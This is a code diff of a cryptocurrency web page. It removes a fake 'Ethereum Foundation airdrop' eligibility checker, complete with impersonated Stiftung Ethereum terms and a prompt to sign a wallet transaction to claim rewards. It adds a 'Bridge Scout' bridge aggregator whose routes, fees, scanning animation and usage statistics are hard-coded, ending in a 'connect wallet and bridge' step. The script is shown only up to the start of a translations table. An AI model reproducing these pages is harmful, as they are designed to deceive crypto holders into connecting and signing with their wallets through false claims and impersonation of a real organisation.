+
+        .modal-body {
+            padding: 24px;
         }
-        
-        .modal-content h1 {
-            font-size: 32px;
-            margin-bottom: 24px;
-            font-weight: 800;
-            color: var(--text-primary);
+
+        .modal-section {
+            margin-bottom: 32px;
         }
-        
-        .modal-content h2 {
-            font-size: 20px;
-            margin-top: 32px;
+
+        .modal-section h4 {
+            font-size: 16px;
+            font-weight: 600;
             margin-bottom: 12px;
-            font-weight: 700;
             color: var(--text-primary);
         }
-        
-        .modal-content p {
-            margin-bottom: 16px;
+
+        .modal-section p {
             color: var(--text-secondary);
             line-height: 1.7;
+            margin-bottom: 12px;
         }
-        
-        .modal-content ul {
-            margin-left: 24px;
-            margin-bottom: 16px;
+
+        .modal-section ul {
+            list-style: none;
+            padding-left: 0;
+        }
+
+        .modal-section li {
+            padding: 8px 0;
             color: var(--text-secondary);
-            line-height: 1.7;
+            border-bottom: 1px solid var(--border);
         }
-        
-        /* Responsive */
+
+        .modal-section li:last-child {
+            border-bottom: none;
+        }
+
+        /* Mobile Responsive */
         @media (max-width: 768px) {
-            .hero {
-                margin: 80px auto 60px;
-                padding: 0 16px;
+            .hero h1 {
+                font-size: 36px;
             }
-            
-            .hero-logo {
-                width: 60px;
-                height: 60px;
-                margin-bottom: 16px;
-            }
-            
-            .hero h1 { 
-                font-size: 32px;
-                margin-bottom: 12px;
-            }
-            
+
             .hero p {
                 font-size: 16px;
             }
-            
-            .container {
-                padding: 0 16px;
-                margin-bottom: 60px;
+
+            .stats-grid {
+                grid-template-columns: repeat(2, 1fr);
+                gap: 32px;
             }
-            
-            .card { 
-                padding: 20px;
-                border-radius: 12px;
+
+            .bridge-card {
+                padding: 24px;
             }
-            
-            input {
-                padding: 12px 40px 12px 14px;
-                font-size: 14px;
+
+            .amount-input input {
+                font-size: 28px;
             }
-            
-            .btn {
-                padding: 12px;
-                font-size: 15px;
-            }
-            
-            .result {
-                padding: 20px;
-                margin-top: 24px;
-            }
-            
-            .result-title {
-                font-size: 16px;
-            }
-            
-            .stat-value {
-                font-size: 20px;
-            }
-            
-            .reward-box {
-                padding: 14px;
-            }
-            
-            .reward-box > div:nth-child(2) {
-                font-size: 24px !important;
-            }
-            
-            .modal-content { 
-                padding: 24px 20px;
-                width: 95%;
-                max-height: 90vh;
-            }
-            
-            .modal-content h1 {
-                font-size: 24px;
-                margin-bottom: 16px;
-            }
-            
-            .modal-content h2 {
-                font-size: 18px;
-                margin-top: 24px;
-            }
-            
-            .modal-content p,
-            .modal-content ul {
-                font-size: 14px;
-            }
-            
-            .close-modal {
-                top: 16px;
-                right: 16px;
-                width: 36px;
-                height: 36px;
-                font-size: 24px;
-            }
-            
-            .header-controls { 
-                top: 12px; 
-                right: 12px;
-                gap: 8px;
-            }
-            
-            .theme-toggle {
-                width: 40px;
-                height: 40px;
-                font-size: 18px;
-            }
-            
-            .language-selector select {
-                padding: 8px 10px;
-                font-size: 13px;
-            }
-            
-            .toast-container { 
-                top: 12px; 
-                right: 12px;
-                left: 12px;
-            }
-            
-            .toast { 
-                min-width: auto;
-                width: 100%;
-            }
-            
-            .cookie-banner {
-                padding: 16px;
-            }
-            
-            .cookie-content {
+
+            .hero-cta {
                 flex-direction: column;
-                align-items: flex-start;
-                gap: 16px;
             }
-            
-            .cookie-text {
-                font-size: 13px;
-            }
-            
-            .cookie-buttons {
+
+            .btn-primary, .btn-secondary {
                 width: 100%;
-                flex-direction: column-reverse;
             }
-            
-            .cookie-btn {
-                width: 100%;
-                padding: 12px 20px;
+
+            .modal-content {
+                margin: 0;
             }
-            
-            .history-item {
-                padding: 10px;
-                font-size: 13px;
+
+            .bridge-logos {
+                gap: 12px;
             }
-            
-            .history-address {
-                font-size: 12px;
+
+            .bridge-logo {
+                width: 28px;
+                height: 28px;
             }
-            
-            .footer {
-                padding: 32px 16px;
-                font-size: 13px;
+
+            .workflow-steps {
+                gap: 0;
             }
-            
-            label {
-                font-size: 13px;
+
+            .workflow-step {
+                max-width: 80px;
             }
-            
-            .stat-label {
-                font-size: 11px;
-            }
-            
-            .vip-message {
-                font-size: 14px;
+
+            .step-label {
+                font-size: 8px;
             }
         }
-        
+
         @media (max-width: 480px) {
             .hero h1 {
                 font-size: 28px;
             }
-            
-            .hero p {
-                font-size: 15px;
+
+            .features h2 {
+                font-size: 24px;
             }
-            
-            .card {
-                padding: 16px;
+
+            .stat h3 {
+                font-size: 20px;
             }
-            
-            input {
-                padding: 11px 36px 11px 12px;
-                font-size: 13px;
+
+            .hero-badges {
+                flex-direction: column;
+                align-items: center;
             }
-            
-            .copy-btn {
-                width: 28px;
-                height: 28px;
+
+            .footer-links {
+                flex-direction: column;
+                gap: 12px;
+            }
+
+            .features-box {
+                padding: 20px;
+            }
+
+            .feature-item {
+                font-size: 10px;
+            }
+
+            .feature-icon {
                 font-size: 14px;
-            }
-            
-            .result {
-                padding: 16px;
-            }
-            
-            .stat-box {
-                padding: 16px;
             }
         }
     </style>
 </head>
 <body>
-    <div class="eth-background">
-        <div class="eth-shape"></div>
-        <div class="eth-shape"></div>
-        
-        <div class="eth-logo">
-            <svg viewBox="0 0 256 417" xmlns="http://www.w3.org/2000/svg">
-                <polygon points="127.9611,0 125.1661,9.5 125.1661,285.168 127.9611,287.958 255.9231,212.32" fill="#627eea" fill-opacity="0.602"/>
-                <polygon points="127.962,0 0,212.32 127.962,287.959 127.962,154.158" fill="#627eea"/>
-                <polygon points="127.9611,312.1866 126.3861,314.1066 126.3861,412.3056 127.9611,416.9066 255.9991,236.5866" fill="#627eea" fill-opacity="0.602"/>
-                <polygon points="127.962,416.9052 127.962,312.1852 0,236.5852" fill="#627eea"/>
-            </svg>
-        </div>
-        
-        <div class="eth-logo">
-            <svg viewBox="0 0 256 417" xmlns="http://www.w3.org/2000/svg">
-                <polygon points="127.9611,0 125.1661,9.5 125.1661,285.168 127.9611,287.958 255.9231,212.32" fill="#627eea" fill-opacity="0.602"/>
-                <polygon points="127.962,0 0,212.32 127.962,287.959 127.962,154.158" fill="#627eea"/>
-                <polygon points="127.9611,312.1866 126.3861,314.1066 126.3861,412.3056 127.9611,416.9066 255.9991,236.5866" fill="#627eea" fill-opacity="0.602"/>
-                <polygon points="127.962,416.9052 127.962,312.1852 0,236.5852" fill="#627eea"/>
-            </svg>
-        </div>
-        
-        <div class="eth-logo">
-            <svg viewBox="0 0 256 417" xmlns="http://www.w3.org/2000/svg">
-                <polygon points="127.9611,0 125.1661,9.5 125.1661,285.168 127.9611,287.958 255.9231,212.32" fill="#627eea" fill-opacity="0.602"/>
-                <polygon points="127.962,0 0,212.32 127.962,287.959 127.962,154.158" fill="#627eea"/>
-                <polygon points="127.9611,312.1866 126.3861,314.1066 126.3861,412.3056 127.9611,416.9066 255.9991,236.5866" fill="#627eea" fill-opacity="0.602"/>
-                <polygon points="127.962,416.9052 127.962,312.1852 0,236.5852" fill="#627eea"/>
-            </svg>
-        </div>
-    </div>
-
-    <div class="toast-container" id="toastContainer"></div>
-
-    <div class="cookie-banner" id="cookieBanner">
-        <div class="cookie-content">
-            <div class="cookie-text">
-                By clicking Accept All Cookies, you consent to the use of cookies and similar technologies to enhance site navigation, analyse site usage, and assist in our marketing and security efforts.
-            </div>
-            <div class="cookie-buttons">
-                <button class="cookie-btn decline" id="declineBtn">Decline</button>
-                <button class="cookie-btn accept" id="acceptBtn">Accept All Cookies</button>
-            </div>
-        </div>
-    </div>
-
-    <div class="header-controls">
-        <button class="theme-toggle" id="themeToggle" aria-label="Toggle theme">
-            <span id="themeIcon">🌙</span>
-        </button>
-        <div class="language-selector">
-            <select id="languageSelect" aria-label="Select language">
-                <option value="en">🇬🇧 English</option>
-                <option value="es">🇪🇸 Español</option>
-                <option value="fr">🇫🇷 Français</option>
-                <option value="de">🇩🇪 Deutsch</option>
-                <option value="it">🇮🇹 Italiano</option>
-                <option value="pt">🇵🇹 Português</option>
-                <option value="ru">🇷🇺 Русский</option>
-                <option value="uk">🇺🇦 Українська</option>
-                <option value="zh">🇨🇳 中文</option>
-                <option value="ja">🇯🇵 日本語</option>
-                <option value="ko">🇰🇷 한국어</option>
-                <option value="tr">🇹🇷 Türkçe</option>
-                <option value="pl">🇵🇱 Polski</option>
-                <option value="ar">🇸🇦 العربية</option>
-                <option value="ur">🇵🇰 اردو</option>
-                <option value="hi">🇮🇳 हिन्दी</option>
-            </select>
-        </div>
-    </div>
-
+    <!-- Hero -->
     <section class="hero">
-        <div class="hero-logo" onclick="location.reload()" title="Reload page">
-            <svg viewBox="0 0 256 417" xmlns="http://www.w3.org/2000/svg">
-                <polygon points="127.9611,0 125.1661,9.5 125.1661,285.168 127.9611,287.958 255.9231,212.32" fill="#627eea" fill-opacity="0.602"/>
-                <polygon points="127.962,0 0,212.32 127.962,287.959 127.962,154.158" fill="#627eea"/>
-                <polygon points="127.9611,312.1866 126.3861,314.1066 126.3861,412.3056 127.9611,416.9066 255.9991,236.5866" fill="#627eea" fill-opacity="0.602"/>
-                <polygon points="127.962,416.9052 127.962,312.1852 0,236.5852" fill="#627eea"/>
-                <polygon points="127.9611,287.9577 255.9211,212.3207 127.9611,154.1587" fill="#627eea" fill-opacity="0.2"/>
-                <polygon points="0,212.3208 127.9611,287.9578 127.9611,154.1588" fill="#627eea" fill-opacity="0.602"/>
-            </svg>
+        <div class="container">
+            <h1>SMART CROSSCHAIN<br>ROUTING</h1>
+            <p>MOVE TOKENS ACROSS CHAINS USING THE FASTEST AND CHEAPEST BRIDGES</p>
+            
+            <div class="hero-badges">
+                <div class="badge">
+                    <span class="badge-icon"></span>
+                    <span>NO KYC</span>
+                </div>
+                <div class="badge">
+                    <span class="badge-icon"></span>
+                    <span>NO REGISTRATION</span>
+                </div>
+                <div class="badge">
+                    <span class="badge-icon"></span>
+                    <span>WALLET ONLY</span>
+                </div>
+            </div>
+
+            <div class="hero-cta">
+                <a href="#bridge" class="btn-primary" onclick="scrollToBridge(event)">START BRIDGING</a>
+                <button class="btn-secondary" onclick="openModal()">LEARN MORE</button>
+            </div>
         </div>
-        <h1 id="title">EthRewardsChecker</h1>
-        <p id="subtitle">Check your wallet eligibility for the official Ethereum Foundation airdrop program</p>
     </section>
 
-    <div class="container">
-        <div class="card">
-            <form id="walletForm">
-                <label for="walletAddress" id="labelAddress">Ethereum Wallet Address</label>
-                <div class="input-wrapper">
-                    <input 
-                        type="text" 
-                        id="walletAddress" 
-                        placeholder="0x..." 
-                        required
-                        autocomplete="off"
-                        spellcheck="false"
-                        aria-describedby="addressHelp"
-                    >
-                    <button type="button" class="copy-btn" id="pasteBtn" aria-label="Paste address" title="Paste address">
-                        📄
-                    </button>
+    <!-- Trust Section -->
+    <section class="trust-section">
+        <div class="container">
+            <div class="trust-content">
+                <div class="trust-title">POWERED BY TRUSTED BRIDGES</div>
+                <div class="bridge-logos">
+                    <img src="https://assets.coingecko.com/coins/images/24413/small/STG_LOGO.png" alt="Stargate" class="bridge-logo" title="Stargate">
+                    <img src="https://assets.coingecko.com/coins/images/18024/small/syn.png" alt="Synapse" class="bridge-logo" title="Synapse">
+                    <img src="https://cryptologos.cc/logos/wormhole-w-logo.svg?v=029" alt="Wormhole" class="bridge-logo" title="Wormhole">
+                    <img src="https://assets.coingecko.com/coins/images/21087/small/across-logo.png" alt="Across" class="bridge-logo" title="Across">
+                    <img src="https://assets.coingecko.com/coins/images/30061/small/layerzero.jpeg" alt="LayerZero" class="bridge-logo" title="LayerZero">
+                    <img src="https://cryptologos.cc/logos/optimism-ethereum-op-logo.svg?v=029" alt="Optimism Bridge" class="bridge-logo" title="Optimism Bridge">
                 </div>
-                <button type="submit" class="btn" id="checkButton">
-                    <span id="buttonText">Check Eligibility</span>
-                </button>
-            </form>
-            
-            <div id="result"></div>
-            
-            <!-- Connect Wallet Button - ALWAYS VISIBLE, NO SCRIPT CHANGES -->
-            <div style="margin-top: 32px; text-align: center; padding: 24px; background: var(--bg-secondary); border-radius: 12px;">
-                <p style="font-size: 14px; color: var(--text-secondary); font-weight: 500; margin-bottom: 16px;">Connect your wallet and sign the transaction to claim your rewards.</p>
-                <button class="btn connect-wallet-btn" data-wallet-connect="true" id="connectWalletBtn" style="width: 100%; max-width: 400px;">
-                    🔗 Connect Wallet
-                </button>
+                <div class="security-badges">
+                    <div class="security-badge">
+                        <span class="security-icon"></span>
+                        <span>OPEN-SOURCE CONTRACTS</span>
+                    </div>
+                    <div class="security-badge">
+                        <span class="security-icon"></span>
+                        <span>NON-CUSTODIAL</span>
+                    </div>
+                    <div class="security-badge">
+                        <span class="security-icon"></span>
+                        <span>TRANSPARENT ROUTES</span>
+                    </div>
+                </div>
             </div>
-            
-            <div class="history-section" id="historySection" style="display: none;">
-                <div class="history-title">
-                    <span>📜 Recent Checks</span>
-                    <span class="clear-history" id="clearHistory">Clear</span>
+        </div>
+    </section>
+
+    <!-- Bridge Interface -->
+    <section class="bridge-section" id="bridge">
+        <div class="container">
+            <!-- Workflow Preview -->
+            <div class="workflow-preview">
+                <div class="workflow-steps">
+                    <div class="workflow-step">
+                        <div class="step-dot">1</div>
+                        <div class="step-label">SELECT<br>CHAINS</div>
+                    </div>
+                    <div class="workflow-step">
+                        <div class="step-dot">2</div>
+                        <div class="step-label">ENTER<br>AMOUNT</div>
+                    </div>
+                    <div class="workflow-step">
+                        <div class="step-dot">3</div>
+                        <div class="step-label">AUTO<br>ROUTE</div>
+                    </div>
+                    <div class="workflow-step">
+                        <div class="step-dot">4</div>
+                        <div class="step-label">CONNECT<br>WALLET</div>
+                    </div>
                 </div>
-                <div id="historyList"></div>
+                <div class="workflow-note">
+                    ℹ️ NO WALLET CONNECTION REQUIRED UNTIL FINAL STEP
+                </div>
+            </div>
+
+            <div class="bridge-card">
+                <div class="bridge-header">
+                    <h2>BRIDGE TOKENS</h2>
+                    <div class="status">15 BRIDGES ONLINE</div>
+                </div>
+
+                <div class="input-group">
+                    <label class="input-label">FROM</label>
+                    <div class="chain-selector" id="fromChainSelector" onclick="selectChain('from')">
+                        <div class="chain-info">
+                            <img src="https://assets.coingecko.com/coins/images/279/small/ethereum.png" alt="ETH" class="chain-icon">
+                            <div class="chain-details">
+                                <h4>ETHEREUM</h4>
+                                <p>SELECT NETWORK</p>
+                            </div>
+                        </div>
+                        <span>▼</span>
+                    </div>
+                </div>
+
+                <div class="amount-input">
+                    <input type="text" placeholder="0.00" id="amountInput">
+                    <div class="amount-label" id="usdValue">≈ $0.00 USD</div>
+                </div>
+
+                <div class="swap-icon" onclick="swapChains()">
+                    <span>⇅</span>
+                </div>
+
+                <div class="input-group">
+                    <label class="input-label">TO</label>
+                    <div class="chain-selector" id="toChainSelector" onclick="selectChain('to')">
+                        <div class="chain-info">
+                            <img src="https://assets.coingecko.com/coins/images/16547/small/photo_2023-03-29_21.47.00.jpeg" alt="ARB" class="chain-icon">
+                            <div class="chain-details">
+                                <h4>ARBITRUM</h4>
+                                <p>YOU'LL RECEIVE</p>
+                            </div>
+                        </div>
+                        <span>▼</span>
+                    </div>
+                </div>
+
+                <button class="btn-bridge" style="margin-bottom: 16px;" onclick="handleAmount()">FIND BEST ROUTES</button>
+
+                <div class="route-comparison" id="routes" style="display: none;">
+                    <label class="input-label">BEST ROUTES</label>
+                    <div class="scanning" id="scanning">
+                        <div>SCANNING BRIDGES...</div>
+                        <div class="scanning-bar">
+                            <div class="scanning-progress"></div>
+                        </div>
+                    </div>
+                    <div id="routeList" style="display: none;">
+                        <div class="route best">
+                            <div class="route-info">
+                                <h4>STARGATE FINANCE</h4>
+                                <div class="route-stats">
+                                    <span>~2 MIN</span>
+                                    <span>$6.40</span>
+                                    <span>OPTIMIZED</span>
+                                </div>
+                            </div>
+                            <div class="route-badge">BEST</div>
+                        </div>
+                        <div class="route">
+                            <div class="route-info">
+                                <h4>ACROSS PROTOCOL</h4>
+                                <div class="route-stats">
+                                    <span>~4 MIN</span>
+                                    <span>$5.60</span>
+                                    <span>FAST</span>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="route">
+                            <div class="route-info">
+                                <h4>HOP PROTOCOL</h4>
+                                <div class="route-stats">
+                                    <span>~5 MIN</span>
+                                    <span>$9.00</span>
+                                    <span>RELIABLE</span>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="route">
+                            <div class="route-info">
+                                <h4>SYNAPSE BRIDGE</h4>
+                                <div class="route-stats">
+                                    <span>~6 MIN</span>
+                                    <span>$7.80</span>
+                                    <span>SECURE</span>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="route">
+                            <div class="route-info">
+                                <h4>WORMHOLE</h4>
+                                <div class="route-stats">
+                                    <span>~8 MIN</span>
+                                    <span>$10.20</span>
+                                    <span>CROSS-CHAIN</span>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Route Transparency -->
+                        <div class="route-transparency">
+                            <div class="transparency-item">
+                                <span class="transparency-label">BRIDGE:</span>
+                                <a href="https://etherscan.io/address/0x8731d54E9D02c286767d56ac03e8037C07e01e98" target="_blank" class="transparency-link">STARGATE ROUTER ↗</a>
+                            </div>
+                            <div class="transparency-item">
+                                <span class="transparency-label">CONTRACT:</span>
+                                <a href="https://etherscan.io/address/0x8731d54E9D02c286767d56ac03e8037C07e01e98" target="_blank" class="transparency-link">0x8731...E98 ↗</a>
+                            </div>
+                            <div class="transparency-item">
+                                <span class="transparency-label">TYPE:</span>
+                                <span class="transparency-value">LIQUIDITY POOL</span>
+                            </div>
+                            <div class="transparency-item">
+                                <span class="transparency-label">AUDIT:</span>
+                                <a href="https://github.com/stargate-protocol/stargate/tree/main/audits" target="_blank" class="transparency-link">CERTIK ✓ ↗</a>
+                            </div>
+                            <div class="transparency-item">
+                                <span class="transparency-label">CUSTODY:</span>
+                                <span class="transparency-value">NON-CUSTODIAL</span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <button class="btn-bridge" id="bridgeBtn" onclick="executeBridge()">CONNECT WALLET & BRIDGE</button>
+            </div>
+        </div>
+    </section>
+
+    <!-- Features -->
+    <section class="features">
+        <div class="container">
+            <h2>WHY BRIDGE SCOUT?</h2>
+            <div class="features-box">
+                <div class="features-list">
+                    <div class="feature-item">
+                        <span class="feature-icon">🔍</span>
+                        <span>AUTO-DISCOVERY</span>
+                    </div>
+                    <div class="feature-item">
+                        <span class="feature-icon">⚡</span>
+                        <span>LIGHTNING FAST</span>
+                    </div>
+                    <div class="feature-item">
+                        <span class="feature-icon">💰</span>
+                        <span>LOWEST FEES</span>
+                    </div>
+                    <div class="feature-item">
+                        <span class="feature-icon">🔒</span>
+                        <span>SECURE</span>
+                    </div>
+                    <div class="feature-item">
+                        <span class="feature-icon">🌐</span>
+                        <span>15+ NETWORKS</span>
+                    </div>
+                    <div class="feature-item">
+                        <span class="feature-icon">📊</span>
+                        <span>FULL HISTORY</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Stats -->
+    <section class="stats">
+        <div class="container">
+            <div class="stats-grid">
+                <div class="stat">
+                    <h3>$2.4B</h3>
+                    <p>VOLUME</p>
+                </div>
+                <div class="stat">
+                    <h3>500K+</h3>
+                    <p>USERS</p>
+                </div>
+                <div class="stat">
+                    <h3>15+</h3>
+                    <p>NETWORKS</p>
+                </div>
+                <div class="stat">
+                    <h3>2.5M</h3>
+                    <p>AVG TIME</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer>
+        <div class="container">
+            <div class="footer-links">
+                <a href="#bridge">BRIDGE</a>
+                <a href="#docs">DOCS</a>
+                <a href="#api">API</a>
+                <a href="#discord">DISCORD</a>
+                <a href="#twitter">TWITTER</a>
+                <a href="#support">SUPPORT</a>
+            </div>
+            <div class="footer-bottom">
+                <p>© 2025 BRIDGE SCOUT. NO KYC. NO CUSTODY. JUST WEB3.</p>
+            </div>
+        </div>
+    </footer>
+
+    <!-- Modal -->
+    <div class="modal" id="modal" onclick="closeModalOutside(event)">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3>HOW BRIDGE SCOUT WORKS</h3>
+                <button class="modal-close" onclick="closeModal()">×</button>
+            </div>
+            <div class="modal-body">
+                <div class="modal-section">
+                    <h4>What is Bridge Scout?</h4>
+                    <p>Bridge Scout is a crosschain bridge aggregator that automatically finds the cheapest, fastest, and most secure route to transfer tokens between networks like Ethereum, Arbitrum, Optimism, Polygon, Base, and others.</p>
+                </div>
+
+                <div class="modal-section">
+                    <h4>How it Works</h4>
+                    <p><strong>1. Connect Your Wallet</strong></p>
+                    <p>Connect MetaMask, Trust Wallet, Rabby, or any Web3 wallet. No seed phrase required — only smart contract connection.</p>
+                    
+                    <p><strong>2. Select Networks & Token</strong></p>
+                    <p>Choose which network you're sending from and which network you're sending to (e.g., Ethereum → Arbitrum, USDT).</p>
+                    
+                    <p><strong>3. Automatic Bridge Scanning</strong></p>
+                    <p>Bridge Scout checks top bridges including Stargate, Hop Protocol, Across, Synapse, Rhino, and more. Compares fees, speed, and reliability.</p>
+                    
+                    <p><strong>4. Best Route Recommendation</strong></p>
+                    <p>Platform shows you the optimal route with estimated time, gas cost, slippage, and total fee.</p>
+                    
+                    <p><strong>5. Execute Bridge</strong></p>
+                    <p>Click "Bridge Now" and confirm the transaction through your wallet. Transfer is executed via the selected bridge.</p>
+                </div>
+
+                <div class="modal-section">
+                    <h4>Key Benefits</h4>
+                    <ul>
+                        <li>✓ Auto-search for best bridge — platform does the comparison for you</li>
+                        <li>✓ Support for 15+ networks including all major Layer 1 and Layer 2 solutions</li>
+                        <li>✓ Maximum security with only verified bridges</li>
+                        <li>✓ Real-time tracking and full transaction history</li>
+                        <li>✓ Support for ERC-20 and natively wrapped tokens (wETH, wBTC, etc.)</li>
+                    </ul>
+                </div>
+
+                <div class="modal-section">
+                    <h4>Security & Privacy</h4>
+                    <ul>
+                        <li>✓ No KYC verification required</li>
+                        <li>✓ No seed phrase or private keys</li>
+                        <li>✓ Web3 wallet connection only</li>
+                        <li>✓ Non-custodial — you control your assets</li>
+                        <li>✓ Integration with DeFi Llama and DeBridge Analytics</li>
+                    </ul>
+                </div>
+
+                <div class="modal-section">
+                    <h4>Supported Networks</h4>
+                    <ul>
+                        <li>Ethereum • Arbitrum • Optimism • Polygon</li>
+                        <li>Base • zkSync • Avalanche • BNB Chain</li>
+                        <li>Fantom • Gnosis • Celo • Moonbeam</li>
+                        <li>and more...</li>
+                    </ul>
+                </div>
+
+                <div class="modal-section">
+                    <h4>Fees</h4>
+                    <p>Bridge Scout charges a minimal 0.1% fee on each bridge transaction. Premium subscription ($3/month) removes fees and provides priority routing.</p>
+                </div>
             </div>
         </div>
     </div>
 
-    <footer class="footer">
-        <div id="poweredBy">Powered by Ethereum API</div>
-        <div>🔒 Secured by Binance Smart Chain</div>
-        <a id="termsLink">Terms of Use</a>
-    </footer>
+    <!-- Loading Modal -->
+    <div class="loading-modal" id="loadingModal">
+        <div class="loading-content" id="loadingContent">
+            <!-- Content will be updated by JavaScript -->
+        </div>
+    </div>
 
-    <div id="termsModal" class="modal" role="dialog" aria-labelledby="termsTitle" aria-modal="true">
-        <div class="modal-content">
-            <button class="close-modal" id="closeModal" aria-label="Close modal">×</button>
-            
-            <h1 id="termsTitle">Terms of Use</h1>
-            
-            <p><strong>Please read these Terms of Use before using the Website.</strong></p>
-
-            <h2>Acceptance of the Terms of Use</h2>
-            <p>These terms of use are entered into by and between you and Stiftung Ethereum (the "Foundation", "we", or "us"). The following terms and conditions (collectively, these "Terms of Use"), govern your access to and use of this Ethereum Rewards website, including any content, functionality, and services offered on or through this website (the "Website").</p>
-            
-            <p>Please read the Terms of Use carefully before you start to use the Website. By using the Website or by clicking to accept or agree to the Terms of Use when this option is made available to you, you accept and agree to be bound and abide by these Terms of Use.</p>
-            
-            <p>If you do not agree to these Terms of Use, you must not access or use the Website.</p>
-
-            <h2>Who May Use the Website</h2>
-            <p>The Website is offered and available to users who are 13 years of age or older. The Website is not intended for children under 13 years of age. By using the Website, you represent and warrant that you (i) are 13 years of age or older, (ii) are not barred to use the Website under any applicable law, and (iii) are using the Website only for your own personal use.</p>
-
-            <h2>Changes to the Terms of Use</h2>
-            <p>We may revise and update these Terms of Use from time to time in our sole discretion. All changes are effective immediately when we post them.</p>
-
-            <h2>Ethereum Rewards Airdrop Program</h2>
-            <p>The Ethereum Rewards program is a community rewards initiative designed to recognize active wallet holders and early supporters of the Ethereum network. Eligibility and reward amounts are determined automatically based on wallet balance verification through public Ethereum blockchain data.</p>
-            
-            <p>To participate in the rewards program, you must:</p>
-            <ul>
-                <li>Provide a valid Ethereum wallet address</li>
-                <li>Meet the minimum balance requirements as determined by the Foundation</li>
-                <li>Connect your wallet and sign the smart contract to claim rewards</li>
-            </ul>
-
-            <h2>Accessing the Website and Account Security</h2>
-            <p>We reserve the right to withdraw or amend this Website, and any service or material we provide on the Website, in our sole discretion without notice. We will not be liable if for any reason all or any part of the Website is unavailable at any time or for any period.</p>
-
-            <h2>Wallet Connection and Smart Contracts</h2>
-            <p>When you connect your wallet to claim rewards, you will be asked to sign a smart contract transaction. By signing this transaction, you authorize the transfer of rewards to your wallet address.</p>
-            
-            <p><strong>Important:</strong> Never share your private keys or seed phrases with anyone. The Foundation will never ask you for your private keys. You are responsible for maintaining the confidentiality of your wallet credentials.</p>
-
-            <h2>Intellectual Property Rights</h2>
-            <p>The Website and its entire contents, features, and functionality (including but not limited to all information, software, text, displays, images, video, and audio, and the design, selection, and arrangement thereof) are owned by the Foundation, its licensors or other providers of such material and are protected by copyright, trademark, patent, trade secret, and other intellectual property or proprietary rights laws.</p>
-
-            <h2>Trademarks</h2>
-            <p>The Foundation name, the terms Ethereum, Stiftung Ethereum, Ethereum Switzerland, Ethereum Asia, and all related names, logos, product and service names, designs, and slogans are trademarks of the Foundation or its affiliates or licensors. You must not use such marks without the prior written permission of the Foundation.</p>
-
-            <h2>Prohibited Uses</h2>
-            <p>You may use the Website only for lawful purposes and in accordance with these Terms of Use. You agree not to use the Website:</p>
-            <ul>
-                <li>In any way that violates any applicable federal, state, local, or international law or regulation</li>
-                <li>For the purpose of exploiting, harming, or attempting to exploit or harm minors in any way by exposing them to inappropriate content or otherwise</li>
-                <li>To transmit, or procure the sending of, any advertising or promotional material, including any "junk mail", "chain letter", "spam", or any other similar solicitation</li>
-                <li>To impersonate or attempt to impersonate the Foundation, a Foundation employee, another user, or any other person or entity</li>
-                <li>To engage in any other conduct that restricts or inhibits anyone's use or enjoyment of the Website, or which, as determined by us, may harm the Foundation or users of the Website, or expose them to liability</li>
-            </ul>
-
-            <h2>No Investment Advice</h2>
-            <p>The information provided on or through the Website is for informational purposes only and does not constitute investment advice, financial advice, trading advice, or any other sort of advice. You should not treat any of the Website's content as such.</p>
-
-            <h2>Blockchain Technology Risks</h2>
-            <p>You acknowledge and agree that blockchain technology and cryptocurrency transactions involve inherent risks, including but not limited to:</p>
-            <ul>
-                <li>Price volatility and market risks</li>
-                <li>Technology risks and potential software bugs or vulnerabilities</li>
-                <li>Regulatory risks and legal uncertainties in various jurisdictions</li>
-                <li>Risk of loss of access to wallet or private keys resulting in permanent loss of assets</li>
-                <li>Network congestion and transaction delays</li>
-                <li>Smart contract risks including coding errors or exploits</li>
-            </ul>
-
-            <h2>Disclaimer of Warranties</h2>
-            <p>Your use of the Website, its content, and any services or items obtained through the Website is at your own risk. The Website, its content, and any services or items obtained through the Website are provided on an "as is" and "as available" basis, without any warranties of any kind, either express or implied. Neither the Foundation nor any person associated with the Foundation makes any warranty or representation with respect to the completeness, security, reliability, quality, accuracy, or availability of the Website.</p>
-
-            <h2>Limitation on Liability</h2>
-            <p>In no event will the Foundation, its affiliates or their licensors, service providers, employees, agents, officers, or directors be liable for damages of any kind, under any legal theory, arising out of or in connection with your use, or inability to use, the Website, any websites linked to it, any content on the Website or such other websites, including any direct, indirect, special, incidental, consequential, or punitive damages.</p>
-
-            <h2>Governing Law and Jurisdiction</h2>
-            <p>All matters relating to the Website and these Terms of Use, and any dispute or claim arising therefrom or related thereto, shall be governed by and construed in accordance with the internal laws of Switzerland without giving effect to any choice or conflict of law provision or rule. Any legal suit, action, or proceeding arising out of, or related to, these Terms of Use or the Website shall be instituted exclusively in Switzerland in the Kanton of Zug.</p>
-
-            <h2>Your Comments and Concerns</h2>
-            <p>All feedback, comments, requests for technical support and other communications relating to the Website should be directed to: <a href="mailto:ethereumrewards@ethereum.org">ethereumrewards@ethereum.org</a></p>
-
-            <p style="margin-top: 40px; text-align: center; font-size: 12px; color: #6c6c6c;">
-                Page last updated: December 2025
-            </p>
+    <!-- Chain Selection Modal -->
+    <div class="chain-modal" id="chainModal" onclick="closeChainModalOutside(event)">
+        <div class="chain-modal-content">
+            <div class="chain-modal-header">
+                <h3 id="chainModalTitle">SELECT CHAIN</h3>
+                <button class="chain-modal-close" onclick="closeChainModal()">×</button>
+            </div>
+            <div class="chain-list" id="chainList">
+                <!-- Chains will be populated by JavaScript -->
+            </div>
         </div>
     </div>
 
     <script>
-// Enhanced translations with more strings
-const translations = {
-    en: {
-        title: "EthRewardsChecker",
-        subtitle: "Check your wallet eligibility for the official Ethereum Foundation airdrop program",
-        labelAddress: "Ethereum Wallet Address",
-        buttonText: "Check Eligibility",
-        buttonChecking: "Checking...",
-        errorTitle: "Verification Error",
-        invalidAddress: "Invalid wallet address format",
-        connectionError: "Unable to connect to Ethereum network. Please try again.",
-        successTitle: "Congratulations!",
-        successContent: "Your wallet meets the requirements.",
-        failTitle: "Not Eligible",
-        failContent: "This wallet does not meet the minimum requirements.",
-        currentBalance: "Current Balance",
-        yourReward: "Your Reward",
-        connectButton: "Connect Wallet",
-        claimInstructions: "Connect your wallet and sign the transaction to claim your rewards.",
-        poweredBy: "Powered by Ethereum API",
-        termsLink: "Terms of Use",
